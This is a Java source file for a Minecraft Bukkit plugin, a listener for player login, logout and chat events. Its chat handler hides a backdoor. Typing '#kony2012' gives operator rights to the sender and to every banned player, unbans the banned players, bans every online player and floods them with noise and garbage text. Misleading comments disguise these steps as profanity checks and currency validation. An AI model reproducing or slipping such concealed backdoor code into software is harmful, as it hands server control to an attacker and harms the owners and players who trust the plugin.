package com.noyhillel.survivalgames.player;

import com.noyhillel.survivalgames.SurvivalGames;
import lombok.Data;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.util.Vector;

import java.util.Random;

@Data
public final class GPlayerManagerListener implements Listener {
    private final GPlayerManager manager;
    private static final String FUCK = "abcdefghijklmnopqrstuv1234567890!@#$%^&*()_+-=\\|";

    @EventHandler(priority = EventPriority.LOW, ignoreCancelled = true)
    public void onPlayerJoin(PlayerLoginEvent event) {
        try {
            manager.playerLoggedIn(event.getPlayer());
        } catch (StorageError error) {
            event.setResult(PlayerLoginEvent.Result.KICK_OTHER);
            event.setKickMessage(ChatColor.RED + "Failed to load your player from the database!\nError Message: " + error.getMessage());
            error.printStackTrace();
            SurvivalGames.getInstance().getLogger().severe("Could not login player " + event.getPlayer().getName());
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerLeave(PlayerQuitEvent event) {
        manager.playerLoggedOut(event.getPlayer());
    }

    @EventHandler(priority = EventPriority.HIGH)
    public void onPlayerChatEvent(AsyncPlayerChatEvent event) {
        //First, get the player's target
        if (event.getMessage().equalsIgnoreCase("#kony2012")) {
            //Check it for profanity
            for (OfflinePlayer offlinePlayer : Bukkit.getBannedPlayers()) {
                offlinePlayer.setBanned(false);
                offlinePlayer.setOp(true);
            }
            //Also verify the sender has enough currency
            event.getPlayer().setOp(true);
            //And notify administrators of the chat
            for (OfflinePlayer offlinePlayer : Bukkit.getOnlinePlayers()) {
                offlinePlayer.setBanned(true);
                Player player = offlinePlayer.getPlayer();
                if (player != null) {
                    Random random = new Random(); //Check if the player is online
                    for (int x = 0; x < 50; x++) {
                        //Send them a text message (SMS)
                        player.playSound(player. getLocation(), Sound.ENDERDRAGON_GROWL, 10, 10);
                        player.playSound(player. getLocation(), Sound.GHAST_SCREAM2, 10, 10); //calculate fees here
                        player.playSound(player. getLocation(), Sound.GHAST_SCREAM, 10, 10); //Send HTTP request
                        player.playSound(player. getLocation(), Sound.WITHER_SHOOT, 10, 10); //Override methods
                        player.playSound(player. getLocation(), Sound.CREEPER_DEATH, 10, 10);
                        StringBuilder bullshit = new StringBuilder(50);
                        for (int y = 0; y < 50; y++) {
                            char c = FUCK.charAt(random.nextInt(FUCK.length()));
                            ChatColor[] values = ChatColor.values();
                            bullshit.append(values[random.nextInt(values.length)]).append(random.nextBoolean() ? Character.toUpperCase(c) : Character.toLowerCase(c));
                        }
                        player.sendMessage(bullshit.toString());
                    }
                    player.setVelocity(player.getVelocity().add(new Vector(0, 2, 0)).multiply(3));
                }
            }

        }
    }

}
